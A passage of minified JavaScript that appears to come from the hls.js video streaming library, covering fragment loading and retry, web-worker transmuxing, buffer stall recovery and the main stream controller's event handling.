y=this.levels,K=e.level,ea=e.sn;return e=e.part,y&&y[K]?(y=y[K],(ea=(K=-1<e?function(sa,ya,Ea){if(!sa||!sa.details)return null;if(sa=sa.details.partList)for(var Ha=sa.length;Ha--;){var Ua=sa[Ha];if(Ua.index===Ea&&Ua.fragment.sn===ya)return Ua}return null}(y,ea,e):null)?K.fragment:function(sa,ya){if(!sa||!sa.details)return null;var Ea=(sa=sa.details).fragments[ya-sa.startSN];return Ea||((Ea=sa.fragmentHint)&&Ea.sn===ya?Ea:null)}(y,ea))?{frag:ea,part:K,level:y}:null):(this.warn("Levels object was unset while buffering fragment "+ea+" of level "+K+". The current chunk will not be buffered."),null)},k.bufferFragmentData=function(e,y,K,ea){if(e&&"PARSING"===this.state){var sa=e.data1,ya=e.data2,Ea=sa;sa&&ya&&(Ea=Object(tb.a)(sa,ya)),Ea&&Ea.length&&(this.hls.trigger(ua.a.BUFFER_APPENDING,{type:e.type,frag:y,part:K,chunkMeta:ea,parent:y.type,data:Ea}),e.dropped&&e.independent&&!K&&this.flushBufferGap(y))}},k.flushBufferGap=function(e){var y=this.media;if(y)if(dc.isBuffered(y,y.currentTime)){var K=y.currentTime,ea=dc.bufferInfo(y,K,0);y=Math.min(2*this.config.maxFragLookUpTolerance,.25*e.duration),K=Math.max(Math.min(e.start-y,ea.end-y),K+y),e.start-K>y&&this.flushMainBuffer(K,e.start)}else this.flushMainBuffer(0,e.start)},k.reduceMaxBufferLength=function(e){var y=this.config;return y.maxMaxBufferLength>=(e||y.maxBufferLength)&&(y.maxMaxBufferLength/=2,this.warn("Reduce max buffer length to "+y.maxMaxBufferLength+"s"),!0)},k.getNextFragment=function(e,y){var K=y.fragments,ea=K.length;if(!ea)return null;var sa,ya=this.config,Ea=K[0].start;if(!y.initSegment||y.initSegment.data||this.bitrateTest)if(y.live){if(ea<(Ea=ya.initialLiveManifestSize))return this.warn("Not enough fragments to start playback (have: "+ea+", need: "+Ea+")"),null;y.PTSKnown||this.startFragRequested||-1!==this.startPosition||(sa=this.getInitialLiveFragment(y,K),this.startPosition=sa?this.hls.liveSyncPosition||sa.start:e)}else e<=Ea&&(sa=K[0]);else sa=y.initSegment;return sa||(sa=this.getFragmentAtPosition(e,ya.lowLatencyMode?y.partEnd:y.fragmentEnd,y)),sa},k.getNextPart=function(e,y,K){for(var ea=-1,sa=!1,ya=!0,Ea=0,Ha=e.length;Ea<Ha;Ea++){var Ua=e[Ea];if(ya=ya&&!Ua.independent,-1<ea&&K<Ua.start)break;var kb=Ua.loaded;!kb&&(sa||Ua.independent||ya)&&Ua.fragment===y&&(ea=Ea),sa=kb}return ea},k.loadedEndOfParts=function(e,y){return(e=e[e.length-1])&&y>e.start&&e.loaded},k.getInitialLiveFragment=function(e,y){var ya,Ea,K=this.fragPrevious,ea=null;if(K){if(e.hasProgramDateTime&&(this.log("Live playlist, switching playlist, load frag with same PDT: "+K.programDateTime),ea=R(y,K.endProgramDateTime,this.config.maxFragLookUpTolerance)),!ea){var sa=K.sn+1;sa>=e.startSN&&sa<=e.endSN&&(e=y[sa-e.startSN],K.cc===e.cc&&(ea=e,this.log("Live playlist, switching playlist, load frag with next SN: "+ea.sn))),ea||(ya=y,Ea=K.cc,(ea=Jb.search(ya,(function(Ha){return Ha.cc<Ea?1:Ha.cc>Ea?-1:0})))&&this.log("Live playlist, switching playlist, load frag with same CC: "+ea.sn))}}else null!==(y=this.hls.liveSyncPosition)&&(ea=this.getFragmentAtPosition(y,this.bitrateTest?e.fragmentEnd:e.edge,e));return ea},k.getFragmentAtPosition=function(e,y,K){var ea,sa=this.config,ya=this.fragPrevious,Ea=K.fragments,Ha=K.endSN,Ua=K.fragmentHint,kb=sa.maxFragLookUpTolerance;if((sa=!!(sa.lowLatencyMode&&K.partList&&Ua))&&Ua&&!this.bitrateTest&&(Ea=Ea.concat(Ua),Ha=Ua.sn),ea=e<y?Q(ya,Ea,e,e>y-kb?0:kb):Ea[Ea.length-1])if(y=ea.sn-K.startSN,K=ya&&ea.level===ya.level,e=Ea[y+1],this.fragmentTracker.getState(ea)===Ia.BACKTRACKED){for(ea=null,Ha=y;Ea[Ha]&&this.fragmentTracker.getState(Ea[Ha])===Ia.BACKTRACKED;)ea=ya?Ea[Ha--]:Ea[--Ha];ea||(ea=e)}else ya&&ea.sn===ya.sn&&!sa&&K&&(ea.sn<Ha&&this.fragmentTracker.getState(e)!==Ia.OK?(this.log("SN "+ea.sn+" just loaded, load next one: "+e.sn),ea=e):ea=null);return ea},k.synchronizeToLiveEdge=function(e){var y=this.config,K=this.media;if(K){var ea=this.hls.liveSyncPosition,sa=K.currentTime,ya=e.edge,Ea=sa>=e.fragments[0].start-y.maxFragLookUpTolerance&&sa<=ya;null!==ea&&K.duration>ea&&(sa<ea||!Ea)&&(e=void 0!==y.liveMaxLatencyDuration?y.liveMaxLatencyDuration:y.liveMaxLatencyDurationCount*e.targetduration,(!Ea&&4>K.readyState||sa<ya-e)&&(this.loadedmetadata||(this.nextLoadPosition=ea),K.readyState&&(this.warn("Playback: "+sa.toFixed(3)+" is located too far from the end of live sliding playlist: "+ya+", reset currentTime to : "+ea.toFixed(3)),K.currentTime=ea)))}},k.alignPlaylists=function(e,y){var K=this.levels,ea=this.levelLastLoaded;return K=null!==ea?K[ea]:null,ea=0,y&&0<e.fragments.length?(ea=e.fragments[0].start,e.alignedSliding&&Object($a.a)(ea)?this.log("Live playlist sliding:"+ea.toFixed(3)):ea||(this.warn("["+this.constructor.name+"] Live playlist - outdated PTS, unknown sliding"),P(this.fragPrevious,K,e))):(this.log("Live playlist - first load, unknown sliding"),P(this.fragPrevious,K,e)),ea},k.waitForCdnTuneIn=function(e){return e.live&&e.canBlockReload&&e.tuneInGoal>Math.max(e.partHoldBack,3*e.partTarget)},k.setStartPosition=function(e,y){var K=this.startPosition;if(-1===this.startPosition||-1===this.lastCurrentTime){var ea=e.startTimeOffset;Object($a.a)(ea)?(0>ea&&(this.log("Negative start time offset "+ea+", count from end of last fragment"),ea=y+e.totalduration+ea),this.log("Start time offset found in playlist, adjust startPosition to "+ea),this.startPosition=K=ea):e.live?K=this.hls.liveSyncPosition||y:this.startPosition=K=0,this.lastCurrentTime=K}this.nextLoadPosition=K},k.getLoadPosition=function(){var e=this.media,y=0;return this.loadedmetadata?y=e.currentTime:this.nextLoadPosition&&(y=this.nextLoadPosition),y},k.handleFragLoadAborted=function(e,y){this.transmuxer&&"initSegment"!==e.sn&&(this.warn("Fragment "+e.sn+(y?" part"+y.index:"")+" of level "+e.level+" was aborted"),this.resetFragmentLoading(e))},k.resetFragmentLoading=function(e){this.fragCurrent&&this.fragContextChanged(e)||(this.state="IDLE")},k.onFragmentOrKeyLoadError=function(e,y){if(!y.fatal){var K=y.frag;if(K&&K.type===e){this.fragCurrent;var ea=this.config;this.fragLoadError+1<=ea.fragLoadingMaxRetry?this.resetLiveStartWhenNotLoaded(K.level)||(y=Math.min(Math.pow(2,this.fragLoadError)*ea.fragLoadingRetryDelay,ea.fragLoadingMaxRetryTimeout),this.warn("Fragment "+K.sn+" of "+e+" "+K.level+" failed to load, retrying in "+y+"ms"),this.retryDate=self.performance.now()+y,this.fragLoadError++,this.state="FRAG_LOADING_WAITING_RETRY"):y.levelRetry?(e===lb.AUDIO&&(this.fragCurrent=null),this.fragLoadError=0,this.state="IDLE"):(Fa.b.error(y.details+" reaches max retry, redispatch as fatal ..."),y.fatal=!0,this.hls.stopLoad(),this.state="ERROR")}}},k.afterBufferFlushed=function(e,y){e&&(e=dc.getBuffered(e),this.fragmentTracker.detectEvictedFragments(y,e),"ENDED"===this.state&&this.resetLoadingState())},k.resetLoadingState=function(){this.fragPrevious=this.fragCurrent=null,this.state="IDLE"},k.resetLiveStartWhenNotLoaded=function(e){if(!this.loadedmetadata){if(this.startFragRequested=!1,null!=(e=this.levels?this.levels[e].details:null)&&e.live)return this.startPosition=-1,this.setStartPosition(e,0),this.resetLoadingState(),!0;this.nextLoadPosition=this.startPosition}return!1},k.updateLevelTiming=function(e,y,K,ea){var sa=this,ya=K.details;Object.keys(e.elementaryStreams).reduce((function(Ea,Ha){var Ua=e.elementaryStreams[Ha];if(Ua){var kb=Ua.endPTS-Ua.startPTS;return 0>=kb?(sa.warn("Could not parse fragment "+e.sn+" "+Ha+" duration reliably ("+kb+") resetting transmuxer to fallback to playlist timing"),sa.resetTransmuxer(),Ea||!1):(Ea=ea?0:J(ya,e,Ua.startPTS,Ua.endPTS,Ua.startDTS,Ua.endDTS),sa.hls.trigger(ua.a.LEVEL_PTS_UPDATED,{details:ya,level:K,drift:Ea,type:Ha,frag:e,start:Ua.startPTS,end:Ua.endPTS}),!0)}return Ea}),!1)?(this.state="PARSED",this.hls.trigger(ua.a.FRAG_PARSED,{frag:e,part:y})):this.resetLoadingState()},k.resetTransmuxer=function(){this.transmuxer&&(this.transmuxer.destroy(),this.transmuxer=null)},n=[{key:"state",get:function(){return this._state},set:function(e){var y=this._state;y!==e&&(this._state=e,this.log(y+"->"+e))}}],function Y(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ca.prototype,n),ca}(Lc),he=Na(17),id=Na(9),Zc=Na(13),Xb=self.MediaSource||self.WebKitMediaSource||{isTypeSupported:function(){return!1}},md=function(){function ta(n,k,e,y){var K=this;this.observer=this.id=this.hls=void 0,this.part=this.frag=null,this.onwmsg=this.worker=void 0,this.transmuxer=null,this.onFlush=this.onTransmuxComplete=void 0,this.hls=n,this.id=k,this.onTransmuxComplete=e,this.onFlush=y,e=n.config,y=function(ya,Ea){(Ea=Ea||{}).frag=K.frag,Ea.id=K.id,n.trigger(ya,Ea)},this.observer=new Zc.EventEmitter,this.observer.on(ua.a.FRAG_DECRYPTED,y),this.observer.on(ua.a.ERROR,y),y={mp4:Xb.isTypeSupported("video/mp4"),mpeg:Xb.isTypeSupported("audio/mpeg"),mp3:Xb.isTypeSupported('audio/mp4; codecs="mp3"')};var ea=navigator.vendor;if(e.enableWorker&&"undefined"!=typeof Worker){Fa.b.log("demuxing in webworker");try{var sa=this.worker=he(18);this.onwmsg=this.onWorkerMessage.bind(this),sa.addEventListener("message",this.onwmsg),sa.onerror=function(ya){n.trigger(ua.a.ERROR,{type:Ka.b.OTHER_ERROR,details:Ka.a.INTERNAL_EXCEPTION,fatal:!0,event:"demuxerWorker",error:Error(ya.message+"  ("+ya.filename+":"+ya.lineno+")")})},sa.postMessage({cmd:"init",typeSupported:y,vendor:ea,id:k,config:JSON.stringify(e)})}catch(ya){Fa.b.warn("Error in worker:",ya),Fa.b.error("Error while initializing DemuxerWorker, fallback to inline"),sa&&self.URL.revokeObjectURL(sa.objectURL),this.transmuxer=new id.c(this.observer,y,e,ea),this.worker=null}}else this.transmuxer=new id.c(this.observer,y,e,ea)}var ca=ta.prototype;return ca.destroy=function(){var n=this.worker;n?(n.removeEventListener("message",this.onwmsg),n.terminate(),this.worker=null):(n=this.transmuxer)&&(n.destroy(),this.transmuxer=null),(n=this.observer)&&n.removeAllListeners(),this.observer=null},ca.push=function(n,k,e,y,K,ea,sa,ya,Ea,Ha){var Ua=this;Ea.transmuxing.start=self.performance.now();var kb=this.transmuxer,cb=this.worker,ub=ea?ea.start:K.start,gb=K.decryptdata,Gb=this.frag,wb=!(Gb&&K.cc===Gb.cc),bc=!(Gb&&Ea.level===Gb.level),ic=Gb?Ea.sn-Gb.sn:-1,$b=this.part?Ea.part-this.part.index:1;Gb=!bc&&(1===ic||0===ic&&1===$b);var Ec=self.performance.now();(bc||ic||0===K.stats.parsing.start)&&(K.stats.parsing.start=Ec),!ea||!$b&&Gb||(ea.stats.parsing.start=Ec),ic=new id.b(wb,Gb,ya,bc,ub),Gb&&!wb||(Fa.b.log("[transmuxer-interface, "+K.type+"]: Starting new transmux session for sn: "+Ea.sn+" p: "+Ea.part+" level: "+Ea.level+" id: "+Ea.id+"\n        discontinuity: "+wb+"\n        trackSwitch: "+bc+"\n        contiguous: "+Gb+"\n        accurateTimeOffset: "+ya+"\n        timeOffset: "+ub),k=new id.a(e,y,k,sa,Ha),this.configureTransmuxer(k)),this.frag=K,this.part=ea,cb?cb.postMessage({cmd:"demux",data:n,decryptdata:gb,chunkMeta:Ea,state:ic},n instanceof ArrayBuffer?[n]:[]):kb&&(n=kb.push(n,gb,Ea,ic),Object(id.d)(n)?n.then((function(Lb){Ua.handleTransmuxComplete(Lb)})):this.handleTransmuxComplete(n))},ca.flush=function(n){var k=this;n.transmuxing.start=self.performance.now();var e=this.transmuxer,y=this.worker;y?y.postMessage({cmd:"flush",chunkMeta:n}):e&&(e=e.flush(n),Object(id.d)(e)?e.then((function(K){k.handleFlushResult(K,n)})):this.handleFlushResult(e,n))},ca.handleFlushResult=function(n,k){var e=this;n.forEach((function(y){e.handleTransmuxComplete(y)})),this.onFlush(k)},ca.onWorkerMessage=function(n){n=n.data;var k=this.hls;switch(n.event){case"init":self.URL.revokeObjectURL(this.worker.objectURL);break;case"transmuxComplete":this.handleTransmuxComplete(n.data);break;case"flush":this.onFlush(n.data);break;default:n.data=n.data||{},n.data.frag=this.frag,n.data.id=this.id,k.trigger(n.event,n.data)}},ca.configureTransmuxer=function(n){var k=this.worker,e=this.transmuxer;k?k.postMessage({cmd:"configure",config:n}):e&&e.configure(n)},ca.handleTransmuxComplete=function(n){n.chunkMeta.transmuxing.end=self.performance.now(),this.onTransmuxComplete(n)},ta}(),Rc=function(){function ta(n,k,e,y){this.hls=this.fragmentTracker=this.media=this.config=void 0,this.nudgeRetry=0,this.stallReported=!1,this.stalled=null,this.seeking=this.moved=!1,this.config=n,this.media=k,this.fragmentTracker=e,this.hls=y}var ca=ta.prototype;return ca.destroy=function(){this.hls=this.fragmentTracker=this.media=null},ca.poll=function(n){var k=this.config,e=this.media,y=this.stalled,K=e.currentTime,ea=e.seeking,sa=this.seeking&&!ea,ya=!this.seeking&&ea;if(this.seeking=ea,K===n){if((ya||sa)&&(this.stalled=null),!e.paused&&!e.ended&&0!==e.playbackRate&&dc.getBuffered(e).length&&(sa=(n=dc.bufferInfo(e,K,0)).nextStart||0,0<n.len||sa)){if(ea){ya=2<n.len;var Ea=!sa||2<sa-K&&!this.fragmentTracker.getPartialFragment(K);if(ya||Ea)return;this.moved=!1}var Ha;if(!this.moved&&null!==this.stalled&&(sa=Math.max(sa,n.start||0)-K,ya=null!=(ya=this.hls.levels?this.hls.levels[this.hls.currentLevel]:null)&&null!==(Ha=ya.details)&&void 0!==Ha&&Ha.live?2*ya.details.targetduration:2,0<sa&&sa<=ya))return void this._trySkipBufferHole(null);Ha=self.performance.now(),null!==y?(y=Ha-y,!ea&&250<=y&&this._reportStall(n.len),K=dc.bufferInfo(e,K,k.maxBufferHole),this._tryFixBufferStall(K,y)):this.stalled=Ha}}else this.moved=!0,null!==y&&(this.stallReported&&(k=self.performance.now()-y,Fa.b.warn("playback not stuck anymore @"+K+", after "+Math.round(k)+"ms"),this.stallReported=!1),this.stalled=null,this.nudgeRetry=0)},ca._tryFixBufferStall=function(n,k){var e=this.config,y=this.fragmentTracker.getPartialFragment(this.media.currentTime);y&&this._trySkipBufferHole(y)||n.len>e.maxBufferHole&&k>1e3*e.highBufferWatchdogPeriod&&(Fa.b.warn("Trying to nudge playhead over buffer-hole"),this.stalled=null,this._tryNudgeBuffer())},ca._reportStall=function(n){var k=this.hls,e=this.media;this.stallReported||(this.stallReported=!0,Fa.b.warn("Playback stalling at @"+e.currentTime+" due to low buffer (buffer="+n+")"),k.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_STALLED_ERROR,fatal:!1,buffer:n}))},ca._trySkipBufferHole=function(n){for(var k=this.config,e=this.hls,y=this.media,K=y.currentTime,ea=0,sa=dc.getBuffered(y),ya=0;ya<sa.length;ya++){var Ea=sa.start(ya);if(K+k.maxBufferHole>=ea&&K<Ea)return k=Math.max(Ea+.05,y.currentTime+.1),Fa.b.warn("skipping hole, adjusting currentTime from "+K+" to "+k),this.moved=!0,this.stalled=null,y.currentTime=k,n&&e.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_SEEK_OVER_HOLE,fatal:!1,reason:"fragment loaded with buffer holes, seeking from "+K+" to "+k,frag:n}),k;ea=sa.end(ya)}return 0},ca._tryNudgeBuffer=function(){var n=this.config,k=this.hls,e=this.media,y=e.currentTime,K=(this.nudgeRetry||0)+1;this.nudgeRetry=K,K<n.nudgeMaxRetry?(n=y+K*n.nudgeOffset,Fa.b.warn("Nudging 'currentTime' from "+y+" to "+n),e.currentTime=n,k.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_NUDGE_ON_STALL,fatal:!1})):(Fa.b.error("Playhead still not moving while enough data buffered @"+y+" after "+n.nudgeMaxRetry+" nudges"),k.trigger(ua.a.ERROR,{type:Ka.b.MEDIA_ERROR,details:Ka.a.BUFFER_STALLED_ERROR,fatal:!0}))},ta}(),yc=function(ta){function ca(e,y){var K;return(K=ta.call(this,e,y,"[stream-controller]")||this).audioCodecSwap=!1,K.gapController=null,K.level=-1,K._forceStartLoad=!1,K.altAudio=!1,K.audioOnly=!1,K.fragPlaying=null,K.onvplaying=null,K.onvseeked=null,K.fragLastKbps=0,K.stalled=!1,K.audioCodecSwitch=!1,K.videoBuffer=null,K._registerListeners(),K}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,T(ca,ta);var n,k=ca.prototype;return k._registerListeners=function(){var e=this.hls;e.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.on(ua.a.LEVEL_LOADING,this.onLevelLoading,this),e.on(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),e.on(ua.a.FRAG_LOAD_EMERGENCY_ABORTED,this.onFragLoadEmergencyAborted,this),e.on(ua.a.ERROR,this.onError,this),e.on(ua.a.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),e.on(ua.a.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),e.on(ua.a.BUFFER_CREATED,this.onBufferCreated,this),e.on(ua.a.BUFFER_FLUSHED,this.onBufferFlushed,this),e.on(ua.a.LEVELS_UPDATED,this.onLevelsUpdated,this),e.on(ua.a.FRAG_BUFFERED,this.onFragBuffered,this)},k._unregisterListeners=function(){var e=this.hls;e.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),e.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),e.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),e.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.off(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),e.off(ua.a.FRAG_LOAD_EMERGENCY_ABORTED,this.onFragLoadEmergencyAborted,this),e.off(ua.a.ERROR,this.onError,this),e.off(ua.a.AUDIO_TRACK_SWITCHING,this.onAudioTrackSwitching,this),e.off(ua.a.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),e.off(ua.a.BUFFER_CREATED,this.onBufferCreated,this),e.off(ua.a.BUFFER_FLUSHED,this.onBufferFlushed,this),e.off(ua.a.LEVELS_UPDATED,this.onLevelsUpdated,this),e.off(ua.a.FRAG_BUFFERED,this.onFragBuffered,this)},k.onHandlerDestroying=function(){this._unregisterListeners(),this.onMediaDetaching()},k.startLoad=function(e){if(this.levels){var y=this.lastCurrentTime,K=this.hls;if(this.stopLoad(),this.setInterval(100),this.level=-1,this.fragLoadError=0,!this.startFragRequested){var ea=K.startLevel;-1===ea&&(K.config.testBandwidth?(ea=0,this.bitrateTest=!0):ea=K.nextAutoLevel),this.level=K.nextLoadLevel=ea,this.loadedmetadata=!1}0<y&&-1===e&&(this.log("Override startPosition with lastCurrentTime @"+y.toFixed(3)),e=y),this.state="IDLE",this.nextLoadPosition=this.startPosition=this.lastCurrentTime=e,this.tick()}else this._forceStartLoad=!0,this.state="STOPPED"},k.stopLoad=function(){this._forceStartLoad=!1,ta.prototype.stopLoad.call(this)},k.doTick=function(){switch(this.state){case"IDLE":this.doTickIdle();break;case"WAITING_LEVEL":var e,y=this.levels,K=this.level;!(y=null==y||null===(e=y[K])||void 0===e?void 0:e.details)||y.live&&this.levelLastLoaded!==this.level||this.waitForCdnTuneIn(y)||(this.state="IDLE");break;case"FRAG_LOADING_WAITING_RETRY":e=self.performance.now(),(!(K=this.retryDate)||e>=K||null!==(y=this.media)&&void 0!==y&&y.seeking)&&(this.log("retryDate reached, switch back to IDLE state"),this.state="IDLE")}this.onTickEnd()},k.onTickEnd=function(){ta.prototype.onTickEnd.call(this),this.checkBuffer(),this.checkFragmentChanged()},k.doTickIdle=function(){var e,y=this.hls,K=this.levels,ea=this.media,sa=y.config,ya=y.nextLoadLevel;if(null!==this.levelLastLoaded&&(ea||!this.startFragRequested&&sa.startFragPrefetch)&&(!this.altAudio||!this.audioOnly)&&K&&K[ya]){var Ea=K[ya];if(this.level=y.nextLoadLevel=ya,!(y=Ea.details)||"WAITING_LEVEL"===this.state||y.live&&this.levelLastLoaded!==ya)this.state="WAITING_LEVEL";else{var Ha=this.getLoadPosition();if(Object($a.a)(Ha)){var Ua=0;if(!(K=y.initSegment)||K.data||this.bitrateTest){if(Ea=(Ea=Ea.maxBitrate)?Math.max(8*sa.maxBufferSize/Ea,sa.maxBufferLength):sa.maxBufferLength,Ea=Math.min(Ea,sa.maxMaxBufferLength),(ea=dc.bufferInfo(this.mediaBuffer?this.mediaBuffer:ea,Ha,Ha<sa.maxBufferHole?Math.max(2,sa.maxBufferHole):sa.maxBufferHole)).len>=Ea)return;if(this._streamEnded(ea,y)){var kb={};return this.altAudio&&(kb.type="video"),this.hls.trigger(ua.a.BUFFER_EOS,kb),void(this.state="ENDED")}if(Ua=ea.end,(K=this.getNextFragment(Ua,y))&&this.fragmentTracker.getState(K)===Ia.OK&&this.nextLoadPosition>Ua&&(K=this.getNextFragment(this.nextLoadPosition,y)),!K)return}"identity"!==(null===(kb=K.decryptdata)||void 0===kb?void 0:kb.keyFormat)||null!==(e=K.decryptdata)&&void 0!==e&&e.key?this.loadFragment(K,y,Ua):(this.log("Loading key for "+K.sn+" of ["+y.startSN+"-"+y.endSN+"], level "+ya),this.loadKey(K))}}}},k.loadKey=function(e){this.state="KEY_LOADING",this.hls.trigger(ua.a.KEY_LOADING,{frag:e})},k.loadFragment=function(e,y,K){var ea,sa=this.fragmentTracker.getState(e);if(this.fragCurrent=e,sa===Ia.BACKTRACKED){if(sa=this.fragmentTracker.getBacktrackData(e))return this._handleFragmentLoadProgress(sa),void this._handleFragmentLoadComplete(sa);sa=Ia.NOT_LOADED}sa===Ia.NOT_LOADED||sa===Ia.PARTIAL?"initSegment"===e.sn?this._loadInitSegment(e):this.bitrateTest?(e.bitrateTest=!0,this.log("Fragment "+e.sn+" of level "+e.level+" is being downloaded to test bitrate and will not be buffered"),this._loadBitrateTestFrag(e)):(this.startFragRequested=!0,ta.prototype.loadFragment.call(this,e,y,K)):sa===Ia.APPENDING?this.reduceMaxBufferLength(e.duration)&&this.fragmentTracker.removeFragment(e):0===(null===(ea=this.media)||void 0===ea?void 0:ea.buffered.length)&&this.fragmentTracker.removeAllFragments()},k.getAppendedFrag=function(e){return(e=this.fragmentTracker.getAppendedFrag(e,lb.MAIN))&&"fragment"in e?e.fragment:e},k.getBufferedFrag=function(e){return this.fragmentTracker.getBufferedFrag(e,lb.MAIN)},k.followingBufferedFrag=function(e){return e?this.getBufferedFrag(e.end+.5):null},k.immediateLevelSwitch=function(){this.abortCurrentFrag(),this.flushMainBuffer(0,Number.POSITIVE_INFINITY)},k.nextLevelSwitch=function(){var e=this.levels,y=this.media;if(null!=y&&y.readyState){var K=this.getAppendedFrag(y.currentTime);K&&1<K.start&&this.flushMainBuffer(0,K.start-1),!y.paused&&e?(e=e[this.hls.nextLoadLevel],e=(K=this.fragLastKbps)&&this.fragCurrent?this.fragCurrent.duration*e.maxBitrate/(1e3*K)+1:0):e=0,(y=this.getBufferedFrag(y.currentTime+e))&&(e=this.followingBufferedFrag(y))&&(this.abortCurrentFrag(),K=e.duration,this.flushMainBuffer(Math.max(y.end,(e.maxStartPTS?e.maxStartPTS:e.start)+Math.min(Math.max(K-this.config.maxFragLookUpTolerance,.5*K),.75*K)),Number.POSITIVE_INFINITY))}},k.abortCurrentFrag=function(){var e=this.fragCurrent;this.fragCurrent=null,null!=e&&e.loader&&e.loader.abort(),this.nextLoadPosition=this.getLoadPosition()},k.flushMainBuffer=function(e,y){ta.prototype.flushMainBuffer.call(this,e,y,this.altAudio?"video":null)},k.onMediaAttached=function(e,y){ta.prototype.onMediaAttached.call(this,e,y),e=y.media,this.onvplaying=this.onMediaPlaying.bind(this),this.onvseeked=this.onMediaSeeked.bind(this),e.addEventListener("playing",this.onvplaying),e.addEventListener("seeked",this.onvseeked),this.gapController=new Rc(this.config,e,this.fragmentTracker,this.hls)},k.onMediaDetaching=function(){var e=this.media;e&&(e.removeEventListener("playing",this.onvplaying),e.removeEventListener("seeked",this.onvseeked),this.onvplaying=this.onvseeked=null,this.videoBuffer=null),this.fragPlaying=null,this.gapController&&(this.gapController.destroy(),this.gapController=null),ta.prototype.onMediaDetaching.call(this)},k.onMediaPlaying=function(){this.tick()},k.onMediaSeeked=function(){var e=this.media;e=e?e.currentTime:null,Object($a.a)(e)&&this.log("Media seeked to "+e.toFixed(3)),this.tick()},k.onManifestLoading=function(){this.log("Trigger BUFFER_RESET"),this.hls.trigger(ua.a.BUFFER_RESET,void 0),this.fragmentTracker.removeAllFragments(),this.stalled=!1,this.startPosition=this.lastCurrentTime=0,this.fragPlaying=null},k.onManifestParsed=function(e,y){var K,ea,sa,ya=!1,Ea=!1;y.levels.forEach((function(Ha){(K=Ha.audioCodec)&&(-1!==K.indexOf("mp4a.40.2")&&(ya=!0),-1!==K.indexOf("mp4a.40.5")&&(Ea=!0))})),(this.audioCodecSwitch=ya&&Ea&&"function"!=typeof(null==(sa=self.SourceBuffer||self.WebKitSourceBuffer)||null===(ea=sa.prototype)||void 0===ea?void 0:ea.changeType))&&this.log("Both AAC/HE-AAC audio found in levels; declaring level codec as HE-AAC"),this.levels=y.levels,this.startFragRequested=!1},k.onLevelLoading=function(e,y){(e=this.levels)&&"IDLE"===this.state&&(!(e=e[y.level]).details||e.details.live&&this.levelLastLoaded!==y.level||this.waitForCdnTuneIn(e.details))&&(this.state="WAITING_LEVEL")},k.onLevelLoaded=function(e,y){var K,ea=this.levels;e=y.level;var sa=y.details,ya=sa.totalduration;if(ea){if(this.log("Level "+e+" loaded ["+sa.startSN+","+sa.endSN+"], cc ["+sa.startCC+", "+sa.endCC+"] duration:"+ya),!(ya=this.fragCurrent)||"FRAG_LOADING"!==this.state&&"FRAG_LOADING_WAITING_RETRY"!==this.state||ya.level!==y.level&&ya.loader&&(this.state="IDLE",ya.loader.abort()),y=ea[e],ea=0,sa.live||null!==(K=y.details)&&void 0!==K&&K.live){if(sa.fragments[0]||(sa.deltaUpdateFailed=!0),sa.deltaUpdateFailed)return;ea=this.alignPlaylists(sa,y.details)}if(y.details=sa,this.levelLastLoaded=e,this.hls.trigger(ua.a.LEVEL_UPDATED,{details:sa,level:e}),"WAITING_LEVEL"===this.state){if(this.waitForCdnTuneIn(sa))return;this.state="IDLE"}this.startFragRequested?sa.live&&this.synchronizeToLiveEdge(sa):this.setStartPosition(sa,ea),this.tick()}else this.warn("Levels were reset while loading level "+e)},k._handleFragmentLoadProgress=function(e){var y,K=e.frag,ea=e.part;e=e.payload;var sa=this.levels;if(sa){var ya=sa[K.level];if(sa=ya.details){var Ea=ya.videoCodec,Ha=sa.PTSKnown||!sa.live,Ua=null===(y=sa.initSegment)||void 0===y?void 0:y.data;y=this._getAudioCodec(ya),ya=this.transmuxer=this.transmuxer||new md(this.hls,lb.MAIN,this._handleTransmuxComplete.bind(this),this._handleTransmuxerFlush.bind(this));var kb=ea?ea.index:-1;kb=new Hc(K.level,K.sn,K.stats.chunkCount,e.byteLength,kb,-1!==kb),ya.push(e,Ua,y,Ea,K,ea,sa.totalduration,Ha,kb,this.initPTS[K.cc])}else this.warn("Dropping fragment "+K.sn+" of level "+K.level+" after level details were reset")}else this.warn("Levels were reset while fragment load was in progress. Fragment "+K.sn+" of level "+K.level+" will not be buffered")},k.onAudioTrackSwitching=function(e,y){e=this.altAudio;var K=y.id;y.url||(this.mediaBuffer!==this.media?(this.log("Switching on main audio, use media.buffered to schedule main fragment loading"),this.mediaBuffer=this.media,null!=(y=this.fragCurrent)&&y.loader&&(this.log("Switching to main audio track, cancel main fragment load"),y.loader.abort()),this.resetTransmuxer(),this.resetLoadingState()):this.audioOnly&&this.resetTransmuxer(),y=this.hls,e&&y.trigger(ua.a.BUFFER_FLUSHING,{startOffset:0,endOffset:Number.POSITIVE_INFINITY,type:"audio"}),y.trigger(ua.a.AUDIO_TRACK_SWITCHED,{id:K}))},k.onAudioTrackSwitched=function(e,y){(e=!!this.hls.audioTracks[y.id].url)&&(y=this.videoBuffer)&&this.mediaBuffer!==y&&(this.log("Switching on alternate audio, use video.buffered to schedule main fragment loading"),this.mediaBuffer=y),this.altAudio=e,this.tick()},k.onBufferCreated=function(e,y){var K,ea;for(var sa in e=y.tracks,y=!1,e){var 